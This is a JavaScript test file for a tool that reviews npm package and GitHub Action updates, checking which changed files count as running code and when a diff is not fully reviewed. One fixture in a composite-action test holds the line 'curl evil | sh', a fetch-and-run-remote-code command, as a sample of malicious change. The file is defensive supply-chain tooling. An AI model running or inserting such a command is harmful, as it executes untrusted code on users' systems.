// Tests for diff budgeting: what counts as code that runs, and when a diff is "not fully reviewed".
import { test, afterEach } from 'node:test';
import assert from 'node:assert/strict';
import { splitGitDiff, fitDiff, reviewNpmDiff, classifyPackageFiles, parseActionRuns, reviewAction } from '../collect-context.mjs';

const fileDiff = (path, body, extra = '') => `diff --git a/${path} b/${path}\n${extra}index v1..v2 100644\n--- a/${path}\n+++ b/${path}\n@@ -1 +1 @@\n${body}`;
const files = obj => Object.entries(obj).map(([name, body]) => ({ name: `package/${name}`, body: Buffer.from(body) }));

test('splitGitDiff splits per file and spots deleted and binary files', () => {
  const chunks = splitGitDiff([
    fileDiff('index.js', '-a\n+b'),
    'diff --git a/old.js b/old.js\ndeleted file mode 100644\n--- a/old.js\n+++ /dev/null\n@@ -1 +0,0 @@\n-x',
    'diff --git a/img.png b/img.png\nBinary files a/img.png and b/img.png differ',
  ].join('\n'));
  assert.deepEqual(chunks.map(c => [c.path, c.deleted, c.binary]), [['index.js', false, false], ['old.js', true, false], ['img.png', false, true]]);
});

test('fitDiff requires all running code, shows context if there is room, lists the rest', () => {
  const chunks = splitGitDiff([fileDiff('index.js', '+RUNS()'), fileDiff('src/a.ts', '+SOURCE()'), fileDiff('README.md', '+docs')].join('\n'));
  const opts = { required: p => p === 'index.js', context: p => p.startsWith('src/') };
  let r = fitDiff(chunks, { ...opts, budget: 10_000 });
  assert.equal(r.complete, true);
  assert.ok(r.text.includes('+RUNS()') && r.text.includes('+SOURCE()') && !r.text.includes('+docs'));
  assert.match(r.text, /not run when the package is used: README\.md/);
  r = fitDiff(chunks, { ...opts, budget: 50 });
  assert.equal(r.complete, false, 'running code over the budget is not fully reviewed');
  assert.match(r.text, /over the review budget: index\.js/);
  r = fitDiff(chunks, { ...opts, budget: fileDiff('index.js', '+RUNS()').length + 5 });
  assert.equal(r.complete, true, 'context that does not fit does not matter');
  assert.match(r.text, /no room: src\/a\.ts/);
  r = fitDiff([{ path: 'addon.node', text: '', binary: true }], { required: () => true, budget: 1e6 });
  assert.equal(r.complete, false, 'a binary change to running code cannot be reviewed');
  r = fitDiff([{ path: 'gone.js', text: '', deleted: true }], { required: () => true, budget: 1e6 });
  assert.equal(r.complete, true, 'a deleted file cannot run');
});

test('classifyPackageFiles: tests and docs are code only when code refers to them', () => {
  const cls = classifyPackageFiles(files({
    'package.json': '{"main":"index.js"}',
    'index.js': "module.exports = require('./lib/loader'); // see data.txt",
    'lib/loader.js': "require('fs').readFileSync(__dirname + '/../data.txt')",
    'data.txt': 'PAYLOAD',
    'README.md': 'docs',
    'test/index.test.js': 'test()',
    '__tests__/x.js': 'x()',
    'logo.png': 'png',
  }));
  assert.ok(cls.codeSet.has('index.js') && cls.codeSet.has('lib/loader.js'));
  assert.ok(cls.codeSet.has('data.txt'), 'unchanged code that mentions data.txt makes it code');
  assert.ok(!cls.codeSet.has('README.md') && !cls.codeSet.has('test/index.test.js') && !cls.codeSet.has('__tests__/x.js') && !cls.codeSet.has('logo.png'));
});

test('reviewNpmDiff only budgets code that runs in the new version', () => {
  const newFiles = { files: files({ 'package.json': '{"main":"index.js"}', 'index.js': 'x', 'README.md': 'docs', 'test/a.test.js': 't' }), unsupported: [] };
  const diff = [fileDiff('index.js', '+CODE()'), fileDiff('README.md', `+${'d'.repeat(5000)}`), fileDiff('test/a.test.js', `+${'t'.repeat(5000)}`), fileDiff('package.json', '+"version": "2"')].join('\n');
  let r = reviewNpmDiff(diff, newFiles, 500);
  assert.equal(r.complete, true, 'big doc and test changes do not use the budget');
  assert.ok(r.text.includes('+CODE()') && r.text.includes('"version": "2"'));
  r = reviewNpmDiff(diff, null, 500);
  assert.equal(r.complete, false, 'without the tarball every text file counts, so this no longer fits');
  assert.equal(r.classified, false);
  r = reviewNpmDiff(diff, { ...newFiles, unsupported: ['x (type L)'] }, 500);
  assert.equal(r.classified, false, 'a tarball the reader cannot fully read is not used to classify');
});

test('parseActionRuns reads the runs: block', () => {
  assert.deepEqual(parseActionRuns("name: x\nruns:\n  using: 'node20'\n  main: 'dist/index.js'\n  post: dist/post.js # cleanup\n  post-if: success()\nbranding:\n  icon: x\n"),
    { using: 'node20', main: 'dist/index.js', post: 'dist/post.js' });
  assert.deepEqual(parseActionRuns('runs:\n  using: composite\n  steps:\n    - run: ./x.sh\n      shell: bash\n'), { using: 'composite' });
  assert.deepEqual(parseActionRuns("runs:\n  using: docker\n  image: 'Dockerfile'\n"), { using: 'docker', image: 'Dockerfile' });
});

// ---- reviewAction against a mocked GitHub API ----
const realFetch = globalThis.fetch;
afterEach(() => { globalThis.fetch = realFetch; });

function mockGitHub({ compare, contents }) {
  globalThis.fetch = async url => {
    const u = new URL(url);
    if (u.pathname.includes('/compare/')) return compare === null ? new Response('{}', { status: 404 }) : Response.json(compare);
    const m = u.pathname.match(/\/contents\/(.+)$/);
    const body = m && contents[`${decodeURIComponent(m[1])}@${u.searchParams.get('ref')}`];
    return body == null ? new Response('', { status: 404 }) : new Response(body);
  };
}
const NODE_YML = 'runs:\n  using: node20\n  main: dist/index.js\n';
const change = { action: 'acme/act', from: { ref: 'v1', tag: 'v1' }, to: { ref: 'v2', tag: 'v2' } };
const compareFiles = (...f) => ({ total_commits: 2, files: f });

test('reviewAction diffs the bundle itself when the compare has no patch for it', async () => {
  mockGitHub({
    compare: compareFiles(
      { filename: 'dist/index.js', status: 'modified', additions: 1, deletions: 1 },
      { filename: 'src/main.ts', status: 'modified', patch: '@@ -1 +1 @@\n+SOURCE()' },
      { filename: '__tests__/main.test.ts', status: 'modified', patch: '@@ -1 +1 @@\n+TEST()' },
      { filename: '.github/workflows/ci.yml', status: 'modified', patch: '@@ -1 +1 @@\n+ci' },
      { filename: 'README.md', status: 'modified', patch: '@@ -1 +1 @@\n+docs' },
    ),
    contents: { 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'run(1)\n', 'dist/index.js@v2': 'run(2)\nEVIL()\n' },
  });
  const r = await reviewAction(change);
  assert.equal(r.complete, true);
  assert.ok(r.text.includes('+EVIL()'), 'the bundle diff was produced and shown');
  assert.ok(r.text.includes('+SOURCE()'), 'source is shown as context');
  assert.ok(!r.text.includes('+TEST()') && !r.text.includes('+ci') && !r.text.includes('+docs'));
});

test('reviewAction is incomplete when the bundle diff does not fit', async () => {
  mockGitHub({
    compare: compareFiles({ filename: 'dist/index.js', status: 'modified', additions: 1, deletions: 1 }),
    contents: { 'action.yml@v2': NODE_YML, 'dist/index.js@v1': 'a\n', 'dist/index.js@v2': `${'b'.repeat(5000)}\n` },
  });
  assert.equal((await reviewAction(change, 1000)).complete, false);
});

test('reviewAction is incomplete for docker actions, missing entries, 300-file compares and failed compares', async () => {
  mockGitHub({ compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n+x' }), contents: { 'action.yml@v2': 'runs:\n  using: docker\n  image: Dockerfile\n' } });
  assert.equal((await reviewAction(change)).complete, false);

  mockGitHub({ compare: compareFiles({ filename: 'action.yml', status: 'modified', patch: '@@\n+x' }), contents: { 'action.yml@v2': NODE_YML } });
  const missing = await reviewAction(change);
  assert.equal(missing.complete, false);
  assert.match(missing.text, /entry file dist\/index\.js not found/);

  mockGitHub({ compare: { total_commits: 1, files: Array.from({ length: 300 }, (_, i) => ({ filename: `docs/${i}.md`, status: 'modified', patch: '@@\n+x' })) }, contents: { 'action.yml@v2': NODE_YML, 'dist/index.js@v2': 'x' } });
  assert.equal((await reviewAction(change)).complete, false);

  mockGitHub({ compare: null, contents: {} });
  assert.equal((await reviewAction(change)).complete, false);
});

test('reviewAction treats every non-doc file of a composite action as code, and handles sub-path actions', async () => {
  mockGitHub({
    compare: compareFiles(
      { filename: 'setup/action.yml', status: 'modified', patch: '@@\n+  - run: ./setup/run.sh' },
      { filename: 'setup/run.sh', status: 'modified', patch: '@@\n+curl evil | sh' },
    ),
    contents: { 'setup/action.yml@v2': 'runs:\n  using: composite\n  steps:\n    - run: ./setup/run.sh\n' },
  });
  const r = await reviewAction({ ...change, action: 'acme/act/setup' }, 40);
  assert.equal(r.complete, false, 'the script runs, so it must fit');
  const ok = await reviewAction({ ...change, action: 'acme/act/setup' });
  assert.ok(ok.complete && ok.text.includes('curl evil'));
});

test('reviewAction returns null for a newly introduced action', async () => {
  assert.equal(await reviewAction({ action: 'acme/new', from: null, to: { ref: 'v1' } }), null);
});
